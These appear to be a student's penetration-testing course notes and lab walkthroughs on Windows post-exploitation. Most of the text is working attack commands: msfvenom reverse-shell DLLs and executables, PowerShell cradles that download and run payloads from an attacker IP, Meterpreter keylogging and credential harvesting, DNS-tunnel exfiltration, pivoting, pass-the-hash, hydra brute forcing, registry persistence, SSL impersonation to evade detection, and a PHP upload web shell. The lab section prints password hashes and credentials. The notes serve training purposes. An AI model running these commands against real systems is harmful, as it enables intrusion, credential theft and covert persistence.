<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	net localgroup "group" &lt;user&gt; /add
	net localgroup "Remote Desktop Users" user /add
</code></pre></div></div>

<blockquote>
  <p>[!NOTE] ps: you have to join groups that allow you access to services such as RDP or Telnet</p>
</blockquote>

<ul>
  <li>ENABLE RDP via Meterpreter</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run getgui -e -u talent -p talent
</code></pre></div></div>

<h3 id="dll-hijacking--preloading--insecure-library-loading">DLL Hijacking / Preloading / Insecure Library Loading</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://support.microsoft.com/en-us/help/2389418/secure-loading-of-libraries-to-prevent-dll-preloading-attacks
</code></pre></div></div>

<p>dll hijacking allows us the ability to abuse a built-in behavior in the way that executables, when launched, search For Dynamic Link Libraries (dlls) to import.
this behavior is known as the DLL search Order 
moreover: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</p>

<h4 id="dll-search-order">DLL Search Order</h4>
<ol>
  <li>The directory from which the application was launched</li>
  <li>The C:\Windows\System32 directory</li>
  <li>The 16-bit Windows system directory (C:\windows\system)</li>
  <li>The Windows directory (C:\windows)</li>
  <li>The current directory at the time of execution</li>
  <li>Any directories specified by the %PATH% environment variable</li>
</ol>

<h4 id="identify">Identify</h4>
<p>Process Monitor: https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</p>

<ol>
  <li>Create a procmon filter For a specific executable we would like to investigate, (in this case “RegSrvc.exe”), and also, create a filter For “NAME NOT FOUND” For the Result column so we can quickly filter on relevant entries.</li>
  <li>Identify cases where the application is looking For a DLL in a directory which we can write to, or modify</li>
  <li>Drop our modified payload in the writable directory</li>
  <li>Restart the Service, re-launch the application, or wait For the system to be rebooted in the case the executable is in fact associated with a service that starts at boot time, or, alternatively, wait For the user to launch the affected application</li>
</ol>

<h4 id="full-example-lab-5">Full Example lab 5</h4>

<h5 id="process-explorer">Process Explorer</h5>
<p>first we open this with administrator privileges
search For an application that is running with system privileges, a third party application
go to the properties, copy the path
check the security of the application and the folder where it is installed
check if the user have access</p>

<h5 id="proc-monitor">Proc monitor</h5>
<p>go to filter
add Process Name = <the process="" you="" found="">
add Result = NAME NOT FOUND
add path contains = dll
kill the process with process explorer
open cmd with administrator privileges
restart the process = net start OutpostFirewall
go to the proc monitor &gt; should appear some processes
we need to choose one that is running with system priveleges
and we must have access to the dll folder path
in this case there is two &gt; UxTheme.dll and imageres.dll
// we have everything we need, we can log in as lowpriv user and exploit</the></p>

<h5 id="payload">Payload</h5>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_https LHOST=&lt;kali IP&gt; LPORT=4444 -f dll &gt; UxTheme.dll
</code></pre></div></div>

<p>// in this case we generate a 32-bit payload because the outpost.exe is 32-bit
// we can use windows/meterpreter/reverse_tcp, is more reliable but less stealthy</p>

<h5 id="send-the-payload-to-the-target">send the payload to the target</h5>
<p>// open a web server:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span>
</code></pre></div></div>

<p>// grab the file in the target machine:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://&lt;attacker_IP&gt;/UxTheme.dll'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\Program Files (x86)\Agnitum\Outpost Firewall 1.0\UxTheme.dll'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<h5 id="handler">Handler</h5>

<ul>
  <li>set a listener in meterpreter</li>
  <li>restart the machine&gt; shutdown /r /t 0</li>
</ul>

<blockquote>
  <p>we should get a shell back
// it took +/- 4 minutes</p>
</blockquote>

<h2 id="data-harvesting-aka-pillaging">Data Harvesting (aka Pillaging)</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Pillaging is the step in which you access sensitive data and intellectual property of the target organization
Getting local information such as files, enumerating credentials, accounts, IM logs and more, but also network information such as internal network blocks in use, domains, intranet servers, shared hard drivers, printers, repositories, etc.

http://www.pentest-standard.org/index.php/Post_Exploitation#Pillaging

The important thing to remember here is that we need to get as much information as we can: 
system info, applications, services, networks, documents, messaging etc
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysinfo
getuid
</code></pre></div></div>

<blockquote>
  <p>figure out the role of the machine in the remote network</p>
</blockquote>

<ul>
  <li>
    <p>you should try to get answers to questions like:
Is this a workstation?
  What department is it from (R&amp;D, Marketing, etc)?</p>
  </li>
  <li>
    <p>Is this a server?
  Then what server (mail, web, a RADIUS etc)?</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>in meterpreter:
	run post/windows/gather
	run post/linux/gather
</code></pre></div></div>

<h4 id="list-services">List services</h4>
<p>run post/windows/gather/enum_services
// the same result can be obtained by opening Services configuration windows (using GUI)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service get Caption,StartName,Stat,pathname 
wmic service where started=true get caption
</code></pre></div></div>

<p>in shell:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net start
// services like DNS or IIS
</code></pre></div></div>

<p>in meterpreter:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service --status-all
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps = to show processes
</code></pre></div></div>

<ul>
  <li>part of a domain or DC</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net view /domain
run post/windows/gather/enum_domains
net group "Domain Controllers" /domain
</code></pre></div></div>

<h4 id="list-users">list users</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user (win)
cat /etc/passwd (linux)
</code></pre></div></div>

<h4 id="list-accounts">List accounts</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run post/windows/gather/enum_ad_bitlocker
run post/windows/gather/enum_ad_computers
run post/windows/gather/enum_ad_groups
run post/windows/gather/enum_ad_service_principal_names
run post/windows/gather/enum_ad_to_wordlist
run post/windows/gather/enum_ad_user_comments
run post/windows/gather/enum_ad_users
net user /domain
</code></pre></div></div>

<h4 id="list-groups">List Groups</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup = all groups
net localgroup &lt;group&gt; = specific group
</code></pre></div></div>

<h4 id="shared-resources">Shared resources</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net share
run enum_shares
</code></pre></div></div>

<ul>
  <li>Moreover
Windows:
  https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US</li>
</ul>

<p>Linux:
	https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit?hl=en_US</p>

<p>OSX:
	https://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit?hl=en_US</p>

<p>Metasploit:
	https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit?pref=2&amp;pli=1</p>

<p>Github:
	https://github.com/mubix/post-exploitation-wiki</p>

<p>tim3warrior:
	http://tim3warri0r.blogspot.it/</p>

<p>web arquive:
	https://web.archive.org/web/20150317144317/https:/n0where.net/linux-post-exploitation</p>

<h4 id="scripts-metasploit">Scripts Metasploit</h4>
<p>scraper = harvests system info including network shares, registry hives and password hashes
winenum = retrieves all kinds of information about the system including environment variables, network interfaces routing, user accounts, etc</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run winenum
run scraper
</code></pre></div></div>

<p>capture the current screen of the target</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>screenshot
eog &lt;path to file&gt;
</code></pre></div></div>

<h4 id="keyloggers">keyloggers</h4>
<p>keyscan_start</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// keyscan_dump
// keyscan_stop
</code></pre></div></div>

<p>keylogrecorder</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-c &lt;option&gt;= which type of key to capture
0 = key presses
1 = winlogon credential capture
2 = no migration
</code></pre></div></div>

<blockquote>
  <p>if we want to log the credentials typed when the user unlocks the screen, we will have to attach the session to the winlogon.exe process (which runs on SYSTEM). 
if we want to dump keystrokes while the user uses application, we will have to attach the process explorer.exe (which runs on user level)</p>
</blockquote>

<ul>
  <li>search</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search -d C:\\Users\\els\\ -f *.kdbx
kdbx = KeePass extension
-d = path where to begin searching from
 -f = file pattern to search
</code></pre></div></div>

<blockquote>
  <p>Once located the file we need, we can download it to our machine with the command download.</p>
</blockquote>

<h4 id="find-credentials">Find credentials</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nirsoft = http://www.nirsoft.net/
run post/windows/gather/credentials/...
	// enum_chrome = can be used to gather credentials stored in Google Chrome For example
run post/multi/gather/...

- What software is installed
run post/windows/gather/enum_applications
</code></pre></div></div>

<h4 id="external-tools">External tools</h4>
<p>Web Browser Pass View = http://www.nirsoft.net/utils/web_browser_password.html
// to extract credentials saved in the web browser installed on the target machine.</p>

<h4 id="exfiltration-over-dns-with-lodine-dns-tunneling">Exfiltration over DNS with lodine (DNS Tunneling)</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://beta.ivc.no/wiki/index.php/DNS_Tunneling
</code></pre></div></div>

<p>// Many organizations are not logging or alerting or anomalous DNS traffic which makes it a go-to vector For exfiltrating data out of a target network, and over often under-monitored <strong>channel</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iodine = https://code.kryo.se/iodine/ // Not only can Iodine help with exfiltrating data from a target environment, but it can also help in penetration testing engagements that restrict access to the internet due to authenticated proxies For which we dont have credentials, or can also be used For bypassing captive portals, such as seen commonly in wireless networks.
</code></pre></div></div>

<p>about the attack: http://beta.ivc.no/wiki/index.php/DNS_Tunneling</p>

<blockquote>
  <p>pre-requisites:</p>
  <ol>
    <li>Control over a domain name that you own and its DNS configuration</li>
    <li>An IP address to act as the authoritative Name Server For your domain name For which you have SSH access to as well.</li>
  </ol>
</blockquote>

<h2 id="mapping-the-internal-network">Mapping the Internal Network</h2>

<h3 id="network-map">network map</h3>
<p>ipconfig / ifconfig 
ipconfig /displaydns
route print / route -v
arp
netstat</p>

<p>run arp_scanner -h
	// using a exploited machine as the router For our scans. This may help to avoid security measures such as firewalls and IDS
run arp_scanner -r <ip></ip></p>

<p>use post/multi/gather/ping_sweep
	// we can set the session in which we would like to run the scan</p>

<p>run netnum -h</p>

<blockquote>
  <p>Now that we know the addresses of new potential targets, we can scan them and check open ports, enabled services, their operating system and so on.
Notice that we are not able to directly access these hosts from our machine, therefore we will have to tunnel our traffic through the session on the exploited machine.
This technique is called Pivoting</p>
</blockquote>

<h3 id="pivoting">Pivoting</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- option 1 - from msf
route add &lt;10.10.10.0&gt; &lt;255.255.255.0&gt; 2
	// all traffic to 10.10.10.0/24 will be tunneled through session 2
route print = to check the result
- option 2 - from the meterpreter session
run autoroute -s 10.10.10.0/24
	// the same result, but it will be routed through the current session
run autoroute -p = to check the result
</code></pre></div></div>

<blockquote>
  <p>[+]
With the route set, we are now able to use the exploited machine (through our meterpreter session) as a router For our communication with the organization internal network (10.10.10.0/24).</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/portscan/tcp
//set options
</code></pre></div></div>

<p>// We can run exploit/psexec and set LHOST to the first target machine
// So it will run the exploit in the second target through the traffic of the first target</p>

<h4 id="socks4-proxy">socks4 proxy</h4>
<p>// sometimes metasploit modules are not enough and we may want to run tools like nmap or nessus on these new hosts. In order to do this we will have to set up a socks4 proxy within metasploit and then use tools like proxychains to route the traffic through this proxy.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/server/socks4a
// set options
// once this module runs, we will see that our host will listen For incoming connection the port
netstat -tulpn | grep &lt;port&gt;
</code></pre></div></div>

<h4 id="proxychains">Proxychains</h4>
<ul>
  <li>is a tool that forces any TCP connection made by any given application, to follow through proxy like SOCKS4, SOCKS5, TOR and so on.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>open the /etc/proxychains.conf
change the last line to: socks4 127.0.0.1 1080
// we are telling proxychains to use SOCKS4 as proxy, on our local address and port 1080.
</code></pre></div></div>
<blockquote>
  <p>[+] how the traffic will be redirect
Tools &gt; proxychains &gt; metasploit socks4a proxy - 0.0.0.0:1080 &gt; meterpreter routes &gt; meterpreter sessions &gt; target network</p>
</blockquote>

<ul>
  <li>now that everything is configured, we can use a scanning tool, such as nmap, against the hosts within the targets internal network.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains nmap -sT -Pn -n &lt;target ip&gt; --top-ports 50
   // by adding proxychains before the nmap scan command, we will force nmap to run through it.
</code></pre></div></div>

<blockquote>
  <p>Thanks to this configuration we are able to route packets to networks behind NAT configurations or Firewalls.
Moreover, we can use proxychains in order to establish connections to services running or machines within the target network</p>
</blockquote>

<p>examples:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains ssh 10.10.10.xx
proxychains telnet 10.10.10.xx
</code></pre></div></div>

<h4 id="portforward">Portforward</h4>
<p>// allows us to forward connections to specific addresses and ports on the remote network
// if we wanna access a web server, a share or any other service on the remote network, we can just set a port forwarding rule through the meterpreter session, and access it from our local address.</p>

<p>in meterpreter:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>portfwd add -l 3333 -p 3389 -r &lt;target ip&gt;
</code></pre></div></div>

<p>open a listener on our local ip address on port 3333
forward the connection to the target IP on port 3389</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -tulpn | grep 3333
</code></pre></div></div>

<ul>
  <li>to show the listening port</li>
</ul>

<blockquote>
  <p>[+] traffic 
// portfwd listener:3333 &gt; meterpreter session &gt; exploited machine &gt; target machine:3389</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop 127.0.0.1:3333
// try to establish an RDP session to our local IP address on port 3333
// it will open the target machine via port: 3389
</code></pre></div>  </div>
</blockquote>

<blockquote>
  <p>Start digging more closely to see if any of the new machines discovered can be exploited</p>
</blockquote>

<h2 id="exploitation-through-pivoting">Exploitation through Pivoting</h2>

<h3 id="pass-the-hash-1">Pass-The-Hash</h3>
<p>When the same password is used on multiple hosts within a network and you get the hash of the password from one of these hosts, you automatically have access to all the other machines.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashdump 

use exploit/windows/smb/psexec
set options
set the SMBPass - a hash instead of the plaintext password
</code></pre></div></div>

<h2 id="regular-payload">Regular Payload</h2>

<p>create a payload:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost=&lt;kali ip&gt; lport=443 -f exe &gt; payload.exe
</code></pre></div></div>

<p>open a listerner:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/multi/handler
set options
</code></pre></div></div>

<blockquote>
  <p>send the payload to the target and run
looking traffic via wireshark, filtering with ssl 
this way our attack can be easily identified</p>
</blockquote>

<h3 id="meterpreter-ssl-certificate-impersonation-and-detection-evasion">Meterpreter SSL Certificate Impersonation and Detection Evasion</h3>
<p>search impersonate_ssl
use auxiliary/gather/impersonate_ssl</p>
<ul>
  <li>this module request a copy of the remote SLL certificate and creates a local (self.signed) version using the information from the remote version.</li>
</ul>

<blockquote>
  <p>set RHOST www.microsoft.com
copy the path of .pem file</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use payload/windows/x64/meterpreter/reverse_https
set options
set handlersslcert = paste the path of the .pem file
set stagerverifysslcert = true
generate -t exe -f payload.exe
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set a handler
exploit/multi/handler
set all the options as you did with the payload
handlersslcert, stagerverifysslcert and so on
</code></pre></div></div>

<ul>
  <li>send the new payload to the target and run</li>
</ul>

<blockquote>
  <p>looking through traffic via wireshark
this way we could bypass defense engagements
because we are using microsoft ssl certificates</p>
</blockquote>

<h3 id="obtaining-stored-credentials-with-sessiongopher">Obtaining Stored Credentials with SessionGopher</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/Arvanaghi/SessionGopher
</code></pre></div></div>

<p>download to the kali machine
open a webserver // python3 -m http.server</p>

<p>go to the target:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-C</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/SessionGopher.ps1'</span><span class="p">);</span><span class="w"> </span><span class="nx">Invoke-SessionGopher</span><span class="w"> </span><span class="nt">-Thorough</span><span class="w">
</span><span class="nt">-nop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="nx">profile</span><span class="w">
</span><span class="nt">-ep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="nx">policy</span><span class="w">
</span><span class="nt">-C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">command</span><span class="w">
</span><span class="nt">-Thorough</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">optional</span><span class="p">,</span><span class="w"> </span><span class="nx">takes</span><span class="w"> </span><span class="nx">longer</span><span class="w">

</span></code></pre></div></div>

<h2 id="labs">Labs</h2>

<h3 id="lab-post-exploitation">Lab Post-Exploitation</h3>

<p>myip: 172.16.5.40
netblock: 10.32.0.0/16</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.32.120.15
Administrator:500:aad3b435b51404eeaad3b435b51404ee:87289513bddc269f9bcb24d74864beb2:::
eLSAdmin:1003:14b13fc03687d1a9f76ccb47241e3d88:ad0f2753ef35b6c90833ef47d9f08192:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:a88f7de3e682d17fea34bd03086620b5:2b07e52daf608f50d4cd9506c5b0220d:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:9f79c84005db73e0122f424022f8dbc0:::
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use post/windows/gather/arp_scanner
run arp_scanner -r &lt;netblock&gt;
multi/gather/ping_sweep
</code></pre></div></div>

<p>10.32.120.1
10.32.120.8
10.32.120.10
10.32.120.13
10.32.120.17</p>

<p>// 10.32.120.15</p>

<ul>
  <li>auxiliary/scanner/portscan/tcp</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.32.120.8 &gt; 135,139,445
10.32.120.10 &gt; 135,139,445
10.32.120.13 &gt; 135,139,445
10.32.120.17 &gt; 135,139,445

found with run winenum
10.32.121.23
</code></pre></div></div>

<p>run post/windows/gather/enum_applications</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	FileZilla Client 3.5.3 3.5.3
	Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148
	Microsoft Visual C++ 2010 x86 Redistributable 10.0.40219
	Security Update \for Windows XP (KB958644) 1
	VMware Tools 8.6.0.6261
	WebFldrs XP 9.50.7523
</code></pre></div></div>

<p>run post/multi/gather/filezilla_client_cred</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	[*]     Server: 10.32.121.23:21
	[*]     Protocol: FTP
	[*]     Username: elsuser_ftp
	[*]     Password: FTPStrongPwd
</code></pre></div></div>

<blockquote>
  <p>if the password is unreadable, go to shell and get manually 
	C:\Documents and Settings\eLSAdmin&gt;cd “Application Data\Filezilla”
	cd “Application Data\Filezilla”</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Documents and Settings\eLSAdmin\Application Data\FileZilla&gt;type sitemanager.xml
</code></pre></div></div>

<ul>
  <li>enable RDP</li>
  <li>create a user and add to the Remote Desktop Users group</li>
</ul>

<p>shell</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user guest_1 guestpwd /add
net localgroup "Remote Desktop Users" guest_1 /add
</code></pre></div></div>

<p>meterpreter</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run getgui -e


rdesktop 10.32.120.15 -u guest_1
</code></pre></div></div>

<blockquote>
  <p>connect to fillezila, enter the credentials to the ftp server that we got earlier
we found that we can write in the ftp server root folder
add autoroute to this new subnet
auxiliary/scanner/portscan/tcp</p>
</blockquote>

<p>scan the new ip 10.32.121.23
ports open:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	21
	23
	80 // there is a web server 
	135
	139
	445
</code></pre></div></div>

<p>// lets portfwd to open in our browser</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>portfwd add -l 8001 -p 80 -r 10.32.121.23
</code></pre></div></div>

<p>// now we can open in our browser via 127.0.0.1:8001
// because it will redirect to the target 10.32.121.23:80</p>

<ul>
  <li>auxiliary/server/socks_proxy
// set the same port as the file /etc/proxychains.conf
// now we can open external tools such as hydra to bruteforce the telnet service</li>
</ul>

<p>// we can try with the users we got via rdesktop in the ftp server</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains hydra -l netadmin -P /usr/share/ncrack/default.pwd 10.32.121.23 telnet -V
</code></pre></div></div>

<p>// we cant use a list of user, because it will kill our meterpreter session</p>

<blockquote>
  <p>I will try later with the sock4a in the 1080 port, with the 9050 I only got error back</p>
</blockquote>

<p>Alternative solution:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>auxiliary/scanner/telnet/telnet_login
</code></pre></div></div>

<blockquote>
  <p>Since the telnet module of MSF isnt very reliable, you can add a port forward. We add a portfwd from our first meterpreter session we obtained previously.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf auxiliary(telnet_login) &gt; sessions -i 1
[meterpreter] &gt; portfwd add -l 2223 -p 23 -r 10.32.121.23
telnet localhost 2223
	netadmin
	abc123
</code></pre></div></div>

<blockquote>
  <p>update the payload to the target machine</p>
</blockquote>

<p>C:\inetpub\ftproot&gt;dir
// view via telnet if the payload is there
// open a handler with the same options as the payload</p>

<p>// run the payload</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\inetpub\ftproot&gt;runas /user:netadmin msf_reverse.exe
</code></pre></div></div>

<ul>
  <li>
    <p>maintaining access via persistence
// set the payload in order to execute our msf payload at system startup</p>
  </li>
  <li>
    <p>in meterpreter session:</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d '"C:\inetpub\ftproot\msf_reverse.exe"' -v msf_reverse
</code></pre></div></div>

<p>//Where -k indicates the registry key path, -d the value of the key and -v the name.</p>

<p>C:\inetpub\wwwroot\intranet&gt;type wp-config.php                                                                    <br />
type wp-config.php</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/** MySQL database password */                                                                                      
define('DB_PASSWORD', 'eLSMySqlDBPwd0905'

root:eLSMySqlDBPwd0905:10.32.121.12
</code></pre></div></div>

<h4 id="2nd-time">2nd time</h4>
<ul>
  <li>
    <p>example: we dont have access to the second machine, but the first machine we explored has. in this case we need to add a route within meterpreter
 → run autoroute -s &lt;ip/network&gt;</p>
  </li>
  <li>
    <p>now we can run an enumeration
 → run post/windows/gather/enum_applications
 → run post/multi/gather/filezilla_client_cred
 // is the password is not readable, we can grab the file manually
 // C:\Users\Administrator\AppData\Roaming\FileZilla\sitemanager.xml</p>
  </li>
  <li>now that we have the login/password of the ftp</li>
  <li>we need to add socks proxy to access that machine
use auxiliary/server/socks_proxy
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/proxychains4.conf
version 4a - port 9050
</code></pre></div>    </div>
  </li>
  <li>now we can use proxychains to scan</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains nmap demo1.ine.local -sT -Pn -p 1-50
</code></pre></div></div>

<blockquote>
  <p>This scan is the safest way to identify the open ports. We could use an auxiliary TCP port scanning module. But those are very aggressive and can kill your session.</p>
</blockquote>

<p>open ports 21 and 22
we can port forward these ports to find the running application name and version. but we know that is telnet and ssh ‘usually’</p>

<ul>
  <li>in the first machine we know that rdp is open on port 3389</li>
  <li>so we can create an user and add in the RDP group to have GUI access</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions -i 1
shell
net user guest_1 guestpwd /add
net localgroup "Remote Desktop Users" guest_1 /add
net user
</code></pre></div></div>

<ul>
  <li>access the target</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:guest_1 /p:guestpwd /v:demo.ine.local
</code></pre></div></div>

<ul>
  <li>open the ftp client (filezilla)</li>
  <li>login with the credentials</li>
  <li>grab the usernames.txt files</li>
  <li>there is 3 usernames:</li>
  <li>
    <p>// administrator - sysadmin - student</p>
  </li>
  <li>now we can target the port 22 of the second machine</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>portfwd add -l 1234 -p 22 -r 10.0.21.78
portfwd list

nmap -sV -p 1234 localhost
</code></pre></div></div>

<ul>
  <li>we can run hydra to try to find the password For the 3 usernames we have:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo1.ine.local ssh
	// administrator:password1
</code></pre></div></div>

<ul>
  <li>background</li>
  <li>use auxiliary/scanner/ssh/ssh_login</li>
  <li>show options</li>
  <li>set gatherproof false</li>
  <li>run</li>
</ul>

<blockquote>
  <p>now we have access to the second machine</p>
</blockquote>

<h3 id="lab-blind-penetration-test">Lab Blind Penetration Test</h3>

<p>my ip 172.16.5.20</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Web Server IP address: 10.100.0.100
Any corporate private address in the range: 192.168.78.0/24
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit(unix/webapp/php_include) &gt; set phpuri /index.php?pag=XXpathXX
</code></pre></div></div>

<ul>
  <li>Open a web server 
// c99, b374k, r57
https://github.com/b374k/b374k</li>
</ul>

<p>// nano include</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"submit"</span><span class="p">]))</span> <span class="p">{</span>
<span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file_upload'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
<span class="c1">// Check for errors</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file_upload'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s1">'An error ocurred'</span><span class="p">);</span>

    <span class="c1">// Upload file</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file_upload'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span><span class="nv">$name</span><span class="p">))</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'Error uploading'</span><span class="p">);</span>

